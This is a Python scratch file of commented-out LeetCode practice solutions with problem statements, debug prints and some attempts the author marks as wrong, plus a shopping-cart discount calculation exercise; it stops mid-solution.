import gc

# lc2032 correct answer
# class Solution:
#     def twoOutOfThree(self, nums1, nums2, nums3):
#         com=[]
#         for i in nums1+nums2+nums3:
#             if i in nums1 and i in nums2 or i in nums2 and i in nums3 or i in nums1 and i in nums3:
#                 com.append(i)
            
#         return set(com)
    
# obje=Solution()
# nums1 = [1,1,3,2]
# nums2 = [2,3]
# nums3 = [3]
# a=obje.twoOutOfThree(nums1,nums2,nums3)
# print(a)


# lc2148
# class Solution:
#     def countElements(self, nums):
#         count=0
#         s=min(nums)
#         l=max(nums)
#         for i in range(len(nums)):
#             if nums[i]==s or nums[i]== l :
#                 continue
#             else:
#                 count += 1
#         return count


# ob=Solution()
# nums = [11,7,2,15]
# a=ob.countElements(nums)
# print(a)


# 2000 CORRECT ANSWER
# class Solution:
#     def reversePrefix(self, word, ch):
#         if ch not in word:
#             return word

#         ind = word.find(ch)
#         prefix_to_reverse = word[:ind+1]
#         reversed_prefix = prefix_to_reverse[::-1]
#         result = reversed_prefix + word[ind+1:]

#         return result

# obj = Solution()
# ch = 'd'
# word = 'abcdefg'
# a = obj.reversePrefix(word, ch)
# print(a)


# 2000 also correct answer my logic 
# class Solution: 
#     def reversePrefix(self, word, ch):
#         if ch not in word:
#             return word
        
#         ind=word.find(ch)
#         wtr=word[:ind+1]
#         rev=wtr[::-1]
#         fw=rev+word[ind+1:]
#         return fw
        
# obj = Solution()
# ch = 'd'
# word = 'abcdefg'
# a = obj.reversePrefix(word, ch)
# print(a)



# lc 2176
# class Solution:
#     def countPairs(self, nums, k):
#         c=0
#         for i in range(len(nums)):
#             for j in range(i+1,len(nums)):
#                 if nums[i]==nums[j]:
#                     k=i*j
#                     # print(k,'b')
#                     if k%2==0:
#                         c+=1
#                         # print(c,'a')        
#         return c
    
    
# obj=Solution()
# nums = [3,1,2,2,2,1,3]
# k = 2
# a=obj.countPairs(nums,k)
# print(a)


# lc2180
# correct solution
# class Solution:
#     def countEven(self, num: int) -> int:
#         c = 0
#         for i in range(2,num+1):
#             sum=0
#             for j in str(i):
#                 sum+=int(j)
#             if sum%2==0:
#                 c+=1
#         return c

# obj = Solution()
# num = 30
# result = obj.countEven(num)
# print(result)


# # lc2185
# class Solution:
#     def prefixCount(self, words, pref):
#         # c=0
#         # for i in range(len( words)):
#         #   if pref in words[i]:
#         #     for j in range (len(words[i])):
#         #             print(words[i][j],'bb')
#         #             if words[i][j][0]==pref[0]:
                        
#         #                 print(words[i][j][0],pref[0],'iiiiiiiiiii')
#         #                 c+=1
#         # return c
#         c=0
#         for i in words:
#             if i.startswith(pref):
#                 c+=1
#         return c

# ob=Solution()

# # words = ["leetcode","win","loops","success"]
# # pref = "code"

# words = ["pay","attention","practice","attend"]
# pref = 'at'


# a=ob.prefixCount(words,pref)
# print(a)


# lc 2210 correct answer
# class Solution:
#     def countHillValley(self, nums):
#         c=0
        
#         for i in range(1,len(nums)-1) :

#             if nums[i] == nums[i+1]:

#               nums[i] = nums[i-1]

#             if nums[i] > nums[i-1] and nums[i] > nums[i+1]:

#               c+=1

#             if nums[i] < nums[i-1] and nums[i] < nums[i+1]:

#               c+=1
              
#         return c
    
# ob=Solution()
# # nums= [6,6,5,5,4,1]
# nums = [2,4,1,1,6,5]
# a=ob.countHillValley(nums)
# print(a)

# lc2264
# class Solution:
#     def largestGoodInteger(self, num) :
#       #correct answeer
#       max_good = ""
    
#       for i in range(len(num) - 2):
#           current_substring = num[i:i+3]
          
#           # Check if the substring consists of only one unique digit
#           if len(set(current_substring)) == 1:
#               # Update the maximum good integer if the current substring is greater
#               max_good = max(max_good, current_substring)
      
#       return max_good
        
      
# wrong answerrrr 
#         com=[]
#         for i in range(len(num)):
#             for j in range(i,len(num)):
#                 if num[i]==num[j]==num[j+1]:
#                     com.append(num[i:j+2])
#                     print(com,'aa')
                    
                    
# ob=Solution()
# num = "6777133339"
# # num = "2300019"
# # num = "42352338"
# a=ob.largestGoodInteger(num)
# print(a)

# class Solution:
#     def mergeTwoLists(self, list1, list2):
#         mergedlits=list1+list2
#         mergedlits.sort()
#         return mergedlits
    
# a=Solution()
# list1 = [1,2,4]
# list2 = [1,3,4]
# la=a.mergeTwoLists(list1,list2)
# print(la)



# correct answer
# lc2016g
# class Solution:
#     def maximumDifference(self, nums) :
#         p=0
#         d=0
#         for i in range(len(nums)):
#             for j in range(i+1,len(nums)):
#                 if nums[j] > nums[i]:
                
#                     d=nums[j]-nums[i]
#                     print(nums[j],'aaa')
#                     print(nums[i],'bbb')
#                     print(nums[j]-nums[i],'cccccc')
                    
#                     if d>=p:
#                         print(d,p,'oo')
#                         p=d
#                         print(p,'joooooo')
   
                    
#         return p

# ov=Solution()
# nums = [1,5,2,10]
# # nums = [7,1,5,4]
# o=ov.maximumDifference(nums)
# print(o)


# lc 2283
# class Solution:
#     def digitCount(self, num: str) -> bool:
#         count = [0] * 10  # To store the count of each digit

#         for digit in num:
#             count[int(digit)] += 1  # Count occurrences of each digit

#         for i in range(len(num)):
#             if int(num[i]) != count[i]:
#                 return False

#         return True

# ob=Solution()
# num='1210'
# # num='030'
# a=ob.digitCount(num)
# print(a)


# 2357. Make Array Zero by Subtracting Equal Amounts
# class Solution:
#     def minimumOperations(self, nums) :
#         num=set(nums)
#         print(num,'aaaaaa')

#         if 0 in num:
            
#             num.remove(0)
#             print(num)
            
#         return len(num)
        
                
                
#         # x=1
#         # c=0
#         # if nums == 0:
#         #     return 0
#         # else:
#         #     for i in range(len(nums)):
#         #         if nums[i]-x==0:
#         #             print(nums[i],'aaa')
#         #             c+=1
#         #         x+=1
#         #     return c
                

# ob=Solution()
# nums = [1,5,0,3,5]
# a=ob.minimumOperations(nums)
# print(a)


# 2351. First Letter to Appear Twice
# class Solution:
#     def repeatedCharacter(self, s):
#         d=''
#         for i in range(len(s)):
#             if s[i] in d:
#                return s[i]
#             d=d+s[i]
#             print(d,'aaaa')
#         return d 
        
        
        
#         # for i in range(len(s)-1):
#         #     if s[i]==s[i+1]:
#         #         return s[i]
            
            
# ob=Solution()
# # s = "abccbaacz"
# s = "abcdde"
# a=ob.repeatedCharacter(s)
# print(a)


# 2413. Smallest Even Multiple
# class Solution:
#     def smallestEvenMultiple(self, n) :
#         if n%2==0:

#             return n 
            
#         return n*2

# obj=Solution()
# n=5
# # n=6
# a=obj.smallestEvenMultiple(n)
# print(a)



# lc 2418
# 2418. Sort the People
# Example 1:
# Input: names = ["Mary","John","Emma"], heights = [180,165,170]
# Output: ["Mary","Emma","John"]
# Explanation: Mary is the tallest, followed by Emma and John.


# class Solution:
#     def sortPeople(self, names, heights):
#         for i in range(len(heights)):
#             for j in range(len(heights)):
#                 if heights[i]<heights[j]:
#                     heights[i],heights[j]=heights[j],heights[i]
#                     names[i],names[j]=names[j],names[i]
#         return names
        
# obj=Solution() 
# names = ["Mary","John","Emma"]
# heights = [180,165,170]
# a=obj.sortPeople(names,heights)     
# print(a)  

# 2475. Number of Unequal Triplets in Array

# class Solution:
#     def unequalTriplets(self, nums):
#         count=0
#         for i in range(len(nums)):
#             for j in range(i+1,len(nums)):
#                 if nums[i]!=nums[j]:
#                     for k in range(j+1,len(nums)):
#                         if nums[i]!=nums[k] and nums[j]!= nums[k]:
#                             count+=1
#         return count
    
# obj=Solution()
# nums=[4,4,2,4,3]
# a=obj.unequalTriplets(nums)
# print(a)

# 2441. Largest Positive Integer That Exists With Its Negative
# class Solution:
#     def findMaxK(self, nums):
#         com=[]
#         nums.sort()
#         for i in range(len(nums)-1):
#             for j in range(i,len(nums)):
#                 if nums[i]+nums[j]==0:
#                     com.append(nums[j])
                    
#         if com:
#             return max(com)
#         else:
#             return-1      
        
# ob=Solution()
# nums = [-1,10,6,7,-7,1]
# a=ob.findMaxK(nums)
# print(a)


# 1370. Increasing Decreasing String
# class Solution:
#     def sortString(self, s: str) -> str:
#         s=list(s)

#         res=''

#         while s:
#             for i in sorted(set(s)): #set use to order
#                 s.remove(i)
#                 # print(s,'aa')
#                 res+=i
#                 print(res,'bb')

#             for i in sorted(set(s), reverse=True):
#                 s.remove(i)
#                 # print(s,'cc')
                
#                 res += i
#                 # print(res,'dd')
                

#         return res
    
    
    
# ob=Solution()
# s = "aaaabbbbcccc"
# a=ob.sortString(s)
# print(a)


# 2511. Maximum Enemy Forts That Can Be Capture
# class Solution:
#     def captureForts(self, forts):
#         com=[]
#         max_len=0
        
#         for i in range(len(forts)):
#             if forts[i]==1 or -1:
#                 l=0
#                 for j in range(i,len(forts)):
#                     if forts[j]== 0:
#                         l+=1
#                         if forts[j+1]==-1:
#                             com.append(l)
#                             print(com,'aaa')
#                             break
#                 max_len=max(com)
#         return max_len
                
# ob=Solution()
# forts = [1,0,0,-1,0,0,0,0,1]
# a=ob.captureForts(forts)
# print(a)

# # 2544. Alternating Digit Sum
# class Solution:
#     def alternateDigitSum(self, n: int) -> int:
#         k=0
#         n=str(n)
#         for i in range(len(n)):
#             if i%2==0:
#               k +=  int(n[i]) 
#             else:
#                k -= int(n[i])
#         return k

# obj=Solution()
# # n=521
# n = 111
# # n = 886996
# a=obj.alternateDigitSum(n)
# print(a)


# 2553. Separate the Digits in an Array
# class Solution:
#     def separateDigits(self, nums):
#         com=[]
#         for i in range (len(nums)):
#                 for j in str(nums[i]):
#                     com.append(int(j))

#         return com

# ob=Solution()
# nums = [13,25,83,77]
# # nums = [7,1,3,9]
# a=ob.separateDigits(nums)
# print(a)



# 2540. Minimum Common Value
# class Solution:
#     def getCommon(self, nums1, nums2):
#         while len(nums1)>0 and len(nums2)>0:
#             if nums1[0]==nums2[0]:
#                 return nums1[0]
#             elif nums1[0]<nums2[0]:
#                 nums1.pop(0)
#             else:
#                 nums2.pop(0)
#         return -1


# ob=Solution()
# nums1 = [1,2,3]
# nums2 = [2,4]

# nums1 = [1,2,3,6]
# nums2 = [2,3,4,5]
# a=ob.getCommon(nums1,nums2)
# print(a)

# 2578. Split With Minimum Sum

# Example 1:

# Input: num = 4325
# Output: 59
# Explanation: We can split 4325 so that num1 is 24 and num2 is 35, giving a sum of 59. We can prove that 59 is indeed the minimal possible sum.
# Example 2:

# Input: num = 687
# Output: 75
# Explanation: We can split 687 so that num1 is 68 and num2 is 7, which would give an optimal sum of 75.

# class Solution:
#     def splitNum(self,num):
#         s = str(num)
#         s = sorted(s)
#         a, b = '', ''
#         for i in range(len(s)):
#             if i % 2 == 0:
#                 a += s[i]
#             else:
#                 b += s[i]
#         return int(a) + int(b)


    
# ob=Solution()
# num = 4325
# a=ob.splitNum(num)
# print(a)





# 2562. Find the Array Concatenation Value
# Easy
# 329
# 11
# Companies
# You are given a 0-indexed integer array nums.

# The concatenation of two numbers is the number formed by concatenating their numerals.

# For example, the concatenation of 15, 49 is 1549.
# The concatenation value of nums is initially equal to 0. Perform this operation until nums becomes empty:

# If there exists more than one number in nums, pick the first element and last element in nums respectively and add the value of their concatenation to the concatenation value of nums, then delete the first and last element from nums.
# If one element exists, add its value to the concatenation value of nums, then delete it.
# Return the concatenation value of the nums.

 

# Example 1:

# Input: nums = [7,52,2,4]
# Output: 596
# Explanation: Before performing any operation, nums is [7,52,2,4] and concatenation value is 0.
#  - In the first operation:
# We pick the first element, 7, and the last element, 4.
# Their concatenation is 74, and we add it to the concatenation value, so it becomes equal to 74.
# Then we delete them from nums, so nums becomes equal to [52,2].
#  - In the second operation:
# We pick the first element, 52, and the last element, 2.
# Their concatenation is 522, and we add it to the concatenation value, so it becomes equal to 596.
# Then we delete them from the nums, so nums becomes empty.
# Since the concatenation value is 596 so the answer is 596.


# class Solution:
#     def findTheArrayConcVal(self, nums):
#         concat=0
        
#         while len(nums)>0:
#             if len(nums)>1:
#                 concat+= int(str(nums[0])+str(nums[-1]))
#                 del nums[-1]
#             else:
#                 concat+= nums[0]
            
#             del nums[0]
#         return  concat
        
        
# obj=Solution()
# nums = [7,52,2,4]
# a=obj.findTheArrayConcVal(nums)
# print(a)




# 2600. K Items With the Maximum Sum

# class Solution:
#     def kItemsWithMaximumSum(self, numOnes: int, numZeros: int, numNegOnes: int, k: int) -> int:
#         if k < numOnes:
#             return k
#         elif k <= numOnes + numZeros:
#             return numOnes
#         else:
#             return numOnes - (k - (numOnes + numZeros))
            
        

# obj=Solution()
# numOnes = 3
# numZeros = 2
# numNegOnes = 0
# k = 2
# a=obj.kItemsWithMaximumSum(numNegOnes,numOnes,numZeros,k)
# print(a)



# 2609. Find the Longest Balanced Substring of a Binary String
# class Solution:
#     def findTheLongestBalancedSubstring(self,s):
#         z=0
#         o=0

#         if len(s)==0:
#             return 0

#         for i in range(len(s)):
#             for j in range(i+1,len(s)):
#                 if i == 0 and s[i]== 0:

#                     if s[i]==0 and s[j]!=0:
#                         break 
#                     o+=1
                
#                 elif i!=0 and s[i]==1:
#                     if s[i]==1 and s[j]!=1:
#                         break
#                     z+=1

#             if o==z:
#                 return o+z
                
#             return 0
            
            
# ob=Solution()
# s='01000111'
# # s='00111'
# # s='111'
# a=ob.findTheLongestBalancedSubstring(s)
# print(a)
            



# 2696. Minimum String Length After Removing Substrings
        # Example 1:
        # Input: s = "ABFCACDB"
        # Output: 2
        # Explanation: We can do the following operations:
        # - Remove the substring "ABFCACDB", so s = "FCACDB".
        # - Remove the substring "FCACDB", so s = "FCAB".
        # - Remove the substring "FCAB", so s = "FC".
        # So the resulting length of the string is 2.
        # It can be shown that it is the minimum length that we can obtain.

        # Example 2:
        # Input: s = "ACBBD"
        # Output: 5
        # Explanation: We cannot do any operations on the string so the length remains the same.



# class Solution:
#     def minLength(self, s) :
#         while 'AB' in s or 'CD' in s:
#             if 'AB' in s:
#                 s=s.replace('AB','')
#             elif 'CD' in s:
#                 s=s.replace('CD','')
#         return len(s)

# obj=Solution()
# s = "ABFCACDB"
# # s = "ACBBD"
# a=obj.minLength(s)
# print(a)



# lc 2839

# s1 = "abcd"
# s2='cdab'
# s1lis=list(s1)
# # print(s1lis[0])
# # print(s2)

# k=''.join(s1lis)
# print(k)


# 2839. Check if Strings Can be Made Equal With Operations I

# Hint
# You are given two strings s1 and s2, both of length 4, consisting of lowercase English letters.

# You can apply the following operation on any of the two strings any number of times:

# Choose any two indices i and j such that j - i = 2, then swap the two characters at those indices in the string.
# Return true if you can make the strings s1 and s2 equal, and false otherwise.

 

# Example 1:

# Input: s1 = "abcd", s2 = "cdab"
# Output: true
# Explanation: We can do the following operations on s1:
# - Choose the indices i = 0, j = 2. The resulting string is s1 = "cbad".
# - Choose the indices i = 1, j = 3. The resulting string is s1 = "cdab" = s2.
# Example 2:

# Input: s1 = "abcd", s2 = "dacb"
# Output: false
# Explanation: It is not possible to make the two strings equal.

# class Solution:
#     def canBeEqual(self, s1,s2):
#         s1,s2 = list(s1),list(s2)
#         s1[1],s1[3] = s1[3],s1[1]
#         if str(s1) == str(s2):
#             return True
#         s1[3],s1[1] = s1[1],s1[3]
#         if str(s1) != str(s2):
#             s1[0],s1[2] = s1[2],s1[0]
#             if str(s1) == str(s2):
#                 return True
#             else:
#                 s1[1],s1[3] = s1[3],s1[1]
#                 if str(s1) == str(s2):
#                     return True
#                 else:
#                     return False
#         else:
#             return True


# obj=Solution()
# s1 = "abcd"
# s2='cdab'
# a=obj.canBeEqual(s1,s2)
# print(a)


# 2864. Maximum Odd Binary Number
# You are given a binary string s that contains at least one '1'.

# You have to rearrange the bits in such a way that the resulting binary number is the maximum odd binary number that can be created from this combination.

# Return a string representing the maximum odd binary number that can be created from the given combination.

# Note that the resulting string can have leading zeros.
 
# Example 1:

# Input: s = "010"
# Output: "001"
# Explanation: Because there is just one '1', it must be in the last position. So the answer is "001".
# Example 2:

# Input: s = "0101"
# Output: "1001"
# Explanation: One of the '1's must be in the last position. The maximum number that can be made with the remaining digits is "100". So the answer is "1001".
 

# class Solution:
#     def maximumOddBinaryNumber(self, s) :
#         one=[]
#         zero=[]
        
#         for i in s :
#                 if i=='1':
#                         one.append(i)
#                 else:
#                         zero.append(i)
#         if len(one)==1:
#                 s1=''.join(zero)+''.join(one)
#         else:
#                 s1 = "".join(one[1:]) + "".join(zero) + one[0]
#         return s1
  
  
# obj=Solution()
# # s = "010"
# s = "0101"
# a=obj.maximumOddBinaryNumber(s)
# print(a)
        
        
# class Solution:
#     def maximumTripletValue(self, nums):
            
#         if len(nums)%2==0:
#             return 0
    
#         else:
#         #     for i in range(len(nums)):
#         #         print(i)
        
#                 m=len(nums)//2
                
#                 # # print(len(nums)) 
                
#                 # f=nums[0]
                
#                 # l=nums[-1]
                
#                 # print(m,f,l) 
                
                
#         f=0
          

#         for i in range(1,m):
#                 if nums[0]<nums[i]:
#                     f=nums[i]  
#                     print(i) 
#                     print(f)
                
                
# obj=Solution()
# # nums = [1,2,3]
# nums = [1,10,3,4,19]
# a=obj.maximumTripletValue(nums)
# print(a)   



########## correct solution for lc 2864
# class Solution:
#     def maximumTripletValue(self, nums):
#         ans=[]
#         for i in range(len(nums)):
#                 for j in range(i+1,len(nums)):
#                         for k in range(j+1,len(nums)):
#                                 res=(nums[i]-nums[j])*nums[k]
#                                 print(nums[i],nums[j],nums[k])
#                                 if res <0:
#                                         res= 0

#                                 ans.append(res)
#                                 print(ans)
#         return max(ans)
# obj=Solution()
# # nums = [1,10,3,4,19]
# nums = [12,6,1,2,7]
# # nums = [1,2,3]
# # nums=[1000000,1,1000000]                               
# a=obj.maximumTripletValue(nums)
# print(a)   



#////////////////////////////////////// zeno techonology

# cartTotal =0  

# productDetails ={
#         'productA':20,
#         'productB':40,
#         'productC':50
# }

# productQuantity={
#         'productA':'',
#         'productB':'',
#         'productC':''
# }
# giftfee=1
# wraptotal=0
# for key,value in productDetails.items():
#         quanity=int(input(f'enter the  quantity for {key}:'))
#         productQuantity[key]=quanity
#         wrapinput=input(f'do you wrap the gift {key} ?,its cost 1 per unit(Yes/No:)')
#         if wrapinput.lower()=='yes':
#                 wrapamt=giftfee*quanity
#                 wraptotal+=wrapamt    
           
# totalProductPrice={
#         'productA':'',
#         'productB':'',
#         'productC':''
# }

# DiscountAmounts={
#         'DiscountA':'',
#         'DiscountB':'',
#         'DiscountC':'',
#         'DiscountD':''
# }

# for key,value in productQuantity.items():
#         cartTotal+=productDetails[key]*value
        
# # indivual price of products
# for key,value in productQuantity.items():
#         iPrice=productDetails[key]*value
#         totalProductPrice[key]=iPrice
          
# for key,value in totalProductPrice.items():
#         qnty=productQuantity[key]
#         price=productDetails[key]
#         print(f'{key}:quantity:{qnty}*{price},total amount:{value}')
        
# print('sub total amount:',cartTotal)

# # flat_10_discount": If cart total exceeds $200, apply a flat $10 discount on the cart total.      
# disAmtA=10      
# if cartTotal > 200:
#         cartA=round(cartTotal-disAmtA)

#         DiscountAmounts['DiscountA']=cartA
# else:
#         DiscountAmounts['DiscountA']=0

# # # "bulk_5_discount": If the quantity of any single product exceeds 10 units, apply a 5% discount on that item's total price.
# per=0
# disAmtB=0.05      
# finalRes=0 
# for key,value in productQuantity.items():
#                 if value>10:
#                         singleprdAmt=productDetails[key]*value
#                         totalDisAmtB=disAmtB*singleprdAmt
#                         cartB =round(cartTotal-totalDisAmtB)  
#                         DiscountAmounts['DiscountB']=cartB 
#                         break
#                 else:
#                         DiscountAmounts['DiscountB']=0

# totalQuantity=0
# qtyoffall=0
# for key,value in productQuantity.items():
#         totalQuantity+=productQuantity[key]
# qtyoffall=totalQuantity

# disAmtC=0
# if qtyoffall > 20:
#         disAmtC=round(0.10 * cartTotal)
#         cartC=cartTotal-disAmtC
#         DiscountAmounts['DiscountC']=cartC
# else:
#         DiscountAmounts['DiscountC']=0
             
# # #"tiered_50_discount": If total quantity exceeds 30 units & any single product quantity greater than 15, then apply a 50% discount on products which are above  15 quantity. The first 15 quantities have the original price and units above 15 will get a 50% discount.           
# if totalQuantity > 30 :
#          print('ssssssss')
#          for key,value in productQuantity.items():
#                 if value>15:
#                         originalPrice=productDetails[key]
#                         disAmtD=0.5*originalPrice
#                         prdQty=productQuantity[key]-15
#                         if prdQty >0:
#                                 totalDisAmt=disAmtD*prdQty
#                                 cartD=round(cartTotal-totalDisAmt)
#                                 DiscountAmounts['DiscountD']=cartD
#                                 break
#                         else:
#                                 DiscountAmounts['DiscountD']=0
#                 else: 
#                         DiscountAmounts['DiscountD']=0
# else: 
#         DiscountAmounts['DiscountD']=0
        
# #//check best discount       /////////////////////////////////////            
# for key,value in DiscountAmounts.items():
#         print(f'{key}:{value}')
       
# filterDic=[]
# for key,value in DiscountAmounts.items():
#         if value >0:
#                 filterDic.append(value)
#         else:
#                 bestOfffer=0 
# if filterDic:                  
#         bestOfffer=min(filterDic)
# else:
#         bestOfffer=0
# max_dis=bestOfffer
# disc=cartTotal-max_dis
# if max_dis:
#         for key,value in DiscountAmounts.items():
#                 if max_dis==DiscountAmounts[key]:
#                         print(f'Discount appleid :{key}: you get discount{disc}')
# else:
#         max_dis=cartTotal
                
# #shipping///////////////////////////////////////////////////
# shipfee=5
# totalPackages=qtyoffall//10
# if qtyoffall % 10!=0:
#         totalPackages+=1
# totalshipfee=shipfee*totalPackages
# cartTotalincludefees=max_dis+wraptotal+totalshipfee
# # print(qtyoffall,'qntyyyyyyyyyyyyy')
# # print(max_dis,'disssssss')
# # print(wraptotal,'wrapppppppp')
# # print(totalshipfee,'shipppppppppp')
# print('Your total amount including shipping and wrap:',cartTotalincludefees)





# 2848. Points That Intersect With Cars
# You are given a 0-indexed 2D integer array nums representing the coordinates of the cars parking on a number line. For any index i, nums[i] = [starti, endi] where starti is the starting point of the ith car and endi is the ending point of the ith car.

# Return the number of integer points on the line that are covered with any part of a car.

 

# Example 1:

# Input: nums = [[3,6],[1,5],[4,7]]
# Output: 7
# Explanation: All the points from 1 to 7 intersect at least one car, therefore the answer would be 7.
# Example 2:

# Input: nums = [[1,3],[5,8]]
# Output: 7
# Explanation: Points intersecting at least one car are 1, 2, 3, 5, 6, 7, 8. There are a total of 7 points, therefore the answer would be 7.

# class Solution:
#     def numberOfPoints(self, nums):
#         newset=set()
#         for i in nums:
#             print(i,'aaaa')
#             for j in range(i[0],i[1]+1):
#                 print(i[0],'bbbbbb')
#                 print(i[1],'cccccc')
#                 print(i[1]+1,'ddddddd')
#                 print(j,'eeeeeeeeeeeeeeee')
                
#                 newset.add(j)
#                 print(newset,'kkkkkkkkkkk')
#         return len(newset)

# obj=Solution()
# nums = [[3,6],[1,5],[4,7]]
# # nums = [[1,3],[5,8]]
# a=obj.numberOfPoints(nums)


# t=3
# x=bin(t)
# print(x)



# 2859. Sum of Values at Indices With K Set Bits
# You are given a 0-indexed integer array nums and an integer k.

# Return an integer that denotes the sum of elements in nums whose corresponding indices have exactly k set bits in their binary representation.

# The set bits in an integer are the 1's present when it is written in binary.

# For example, the binary representation of 21 is 10101, which has 3 set bits.
 
# Example 1:

# Input: nums = [5,10,1,5,2], k = 1
# Output: 13
# Explanation: The binary representation of the indices are: 
# 0 = 0002
# 1 = 0012
# 2 = 0102
# 3 = 0112
# 4 = 1002 
# Indices 1, 2, and 4 have k = 1 set bits in their binary representation.
# Hence, the answer is nums[1] + nums[2] + nums[4] = 13.
# Example 2:

# Input: nums = [4,3,2,1], k = 2
# Output: 1
# Explanation: The binary representation of the indices are:
# 0 = 002
# 1 = 012
# 2 = 102
# 3 = 112
# Only index 3 has k = 2 set bits in its binary representation.
# Hence, the answer is nums[3] = 1.


# class Solution:
#     def sumIndicesWithKSetBits(self, nums,k):
#         p=[]
#         for i in nums:
#                 z=bin(i)
#                 c=z.replace('0b','')
#                 l=c.count('1')
                
#                 if k==l:
#                         p.append(nums[i])
#                 s=sum(p)
                        
#         return s
            
# obj=Solution()
# # nums = [4,3,2,1]
# # k = 2

# nums = [5,10,1,5,2]
# k = 1
# a=obj.sumIndicesWithKSetBits(nums,k)
# print(a)



# nums = [5,10,1,5,2]
# for i in range(len(nums)):
#     print(i)

# for i in nums:
#     print(i)


        
# a='hello'
# s=a[:2]
# print(s)  
        
# 2710. Remove Trailing Zeros From a String       
# Given a positive integer num represented as a string, return the integer num without trailing zeros as a string.

 

# Example 1:

# Input: num = "51230100"
# Output: "512301"
# Explanation: Integer "51230100" has 2 trailing zeros, we remove them and return integer "512301".
# Example 2:

# Input: num = "123"
# Output: "123"
# Explanation: Integer "123" has no trailing zeros, we return integer "123".
    
    
# class Solution:
#     def removeTrailingZeros(self,num):
#         j=0
#         nm=int(num)
#         if nm%10==0:
#                 rev=num[::-1]
#                 for i in rev:
#                         if i =='0':
#                                 j+=1
#                         else:
#                               finalres=rev[j:]
#                               res=finalres[::-1]
#                               return res
                      

#                 print(nm)
#         else:
#               return num
              

# obj=Solution()
# num = "51230100"
# # num = "123"
# a=obj.removeTrailingZeros(num)
# print(a)
  

# 2716. Minimize String Length
# class Solution:
#     def minimizedStringLength(self, s):
#         a=[]
#         for i in s:
#             a.append(i)
#         b=set(a)
#         print(b)
#         return len(b)

# obj=Solution()
# s = "aaabc"
# # s = "cbbd"
# # s = "dddaaa"
# a=obj.minimizedStringLength(s)
# print(a)



# 2903. Find Indices With Index and Value Difference I

# You are given a 0-indexed integer array nums having length n, an integer indexDifference, and an integer valueDifference.

# Your task is to find two indices i and j, both in the range [0, n - 1], that satisfy the following conditions:

# abs(i - j) >= indexDifference, and
# abs(nums[i] - nums[j]) >= valueDifference
# Return an integer array answer, where answer = [i, j] if there are two such indices, and answer = [-1, -1] otherwise. If there are multiple choices for the two indices, return any of them.

# Note: i and j may be equal.


# Example 1:

# Input: nums = [5,1,4,1], indexDifference = 2, valueDifference = 4
# Output: [0,3]
# Explanation: In this example, i = 0 and j = 3 can be selected.
# abs(0 - 3) >= 2 and abs(nums[0] - nums[3]) >= 4.
# Hence, a valid answer is [0,3].
# [3,0] is also a valid answer.
# Example 2:

# Input: nums = [2,1], indexDifference = 0, valueDifference = 0
# Output: [0,0]
# Explanation: In this example, i = 0 and j = 0 can be selected.
# abs(0 - 0) >= 0 and abs(nums[0] - nums[0]) >= 0.
# Hence, a valid answer is [0,0].
# Other valid answers are [0,1], [1,0], and [1,1].
# Example 3:

# Input: nums = [1,2,3], indexDifference = 2, valueDifference = 4
# Output: [-1,-1]
# Explanation: In this example, it can be shown that it is impossible to find two indices that satisfy both conditions.
# Hence, [-1,-1] is returned.

# class Solution:
#     def findIndices(self, nums, indexDifference, valueDifference ):
#         n=len(nums)
#         for i in range(n):
#             for j in range(i+indexDifference,n):
#                 if abs(i-j)>=indexDifference and abs(nums[i]-nums[j])>=valueDifference:
#                     return [i,j]
               
#         return [-1,-1]
    

    
# obj=Solution()
# nums = [5,1,4,1]
# indexDifference = 2
# valueDifference = 4

# nums = [2,1]
# indexDifference = 0
# valueDifference = 0

# nums = [1,2,3]
# indexDifference = 2
# valueDifference = 4
# a=obj.findIndices(nums,valueDifference,indexDifference)
# print(a)
        


# 2908. Minimum Sum of Mountain Triplets I
# You are given a 0-indexed array nums of integers.

# A triplet of indices (i, j, k) is a mountain if:

# i < j < k
# nums[i] < nums[j] and nums[k] < nums[j]
# Return the minimum possible sum of a mountain triplet of nums. If no such triplet exists, return -1.

# Example 1:

# Input: nums = [8,6,1,5,3]
# Output: 9
# Explanation: Triplet (2, 3, 4) is a mountain triplet of sum 9 since: 
# - 2 < 3 < 4
# - nums[2] < nums[3] and nums[4] < nums[3]
# And the sum of this triplet is nums[2] + nums[3] + nums[4] = 9. It can be shown that there are no mountain triplets with a sum of less than 9.
# Example 2:

# Input: nums = [5,4,8,7,10,2]
# Output: 13
# Explanation: Triplet (1, 3, 5) is a mountain triplet of sum 13 since: 
# - 1 < 3 < 5
# - nums[1] < nums[3] and nums[5] < nums[3]
# And the sum of this triplet is nums[1] + nums[3] + nums[5] = 13. It can be shown that there are no mountain triplets with a sum of less than 13.
# Example 3:

# Input: nums = [6,5,4,3,4,5]
# Output: -1
# Explanation: It can be shown that there are no mountain triplets in nums.
 
# Constraints:

# 3 <= nums.length <= 50
# 1 <= nums[i] <= 50

# LC 2908
# class Solution:
#     def minimumSum(self, nums):
#         s=0
#         arr=[]
#         for i in range(len(nums)):
#             for j in range(i+1,len(nums)):
#                 for k in range(j+1,len(nums)):
#                     if i<j<k :
#                         if nums[i]<nums[j] and nums[k]<nums[j]:
#                             s=nums[i]+nums[j]+nums[k]
#                             arr.append(s)

#         if arr:
#             print(arr)
#             return min(arr)

#         else:
#             return -1
# obj=Solution()
# # nums = [8,6,1,5,3]
# nums = [5,4,8,7,10,2]
# # nums = [6,5,4,3,4,5]
# a=obj.minimumSum(nums)
# print(a)

# 2913. Subarrays Distinct Element Sum of Squares I
# You are given a 0-indexed integer array nums.

# The distinct count of a subarray of nums is defined as:

# Let nums[i..j] be a subarray of nums consisting of all the indices from i to j such that 0 <= i <= j < nums.length. Then the number of distinct values in nums[i..j] is called the distinct count of nums[i..j].
# Return the sum of the squares of distinct counts of all subarrays of nums.

# A subarray is a contiguous non-empty sequence of elements within an array.

# Example 1:
# Input: nums = [1,2,1]
# Output: 15
# Explanation: Six possible subarrays are:
# [1]: 1 distinct value
# [2]: 1 distinct value
# [1]: 1 distinct value
# [1,2]: 2 distinct values
# [2,1]: 2 distinct values
# [1,2,1]: 2 distinct values
# The sum of the squares of the distinct counts in all subarrays is equal to 12 + 12 + 12 + 22 + 22 + 22 = 15.

# Example 2:
# Input: nums = [1,1]
# Output: 3
# Explanation: Three possible subarrays are:
# [1]: 1 distinct value
# [1]: 1 distinct value
# [1,1]: 1 distinct value
# The sum of the squares of the distinct counts in all subarrays is equal to 12 + 12 + 12 = 3.
 
# Constraints:
# 1 <= nums.length <= 100
# 1 <= nums[i] <= 100


# lc 2913
# class Solution:
#     def sumCounts(self, nums):
#       res=0
#       n=len(nums)

#       for i in range(n):
#         print(i,'aaaaaa')
#         distinct=set()
#         for j in range(i,n):
